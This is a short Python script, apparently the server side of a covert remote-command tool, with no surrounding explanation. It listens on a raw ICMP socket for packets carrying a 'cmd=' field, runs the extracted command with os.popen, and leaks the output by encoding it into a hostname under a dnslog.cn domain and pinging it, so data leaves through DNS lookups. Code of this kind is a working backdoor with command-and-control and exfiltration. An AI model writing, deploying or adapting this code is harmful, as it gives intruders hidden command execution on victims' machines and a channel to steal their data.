#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author  : Lemon pineapple
# @FileName: Server
# @Software: PyCharm
# @Github  : SkyBlueEternal.github.io Or skyblueeternal.gitee.io/blog


import os
import socket

if __name__ == '__main__':
    HOST = "192.168.158.129"
    url = "0p5ots.dnslog.cn"
    if os.name == "nt":
        socket_protocol = socket.IPPROTO_IP
    else:
        socket_protocol = socket.IPPROTO_ICMP
    rawSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
    rawSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rawSocket.bind((HOST, 0))
    rawSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    if os.name == "nt":
        rawSocket.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    while True:
        pkt = rawSocket.recvfrom(2048)
        a = str(pkt).split("|")
        if "Rcode" in a:
            b = a[2].replace("cmd=","").replace("?","")
            c = os.popen(b)
            cmd = "ping {0}.{1} -c 1".format(c.read().strip("\r").strip("\n").replace("\\",".x.").replace("\/",".xx.").replace(":",".m."),url)
            c.close()
            print(cmd)
            d = os.system(cmd)
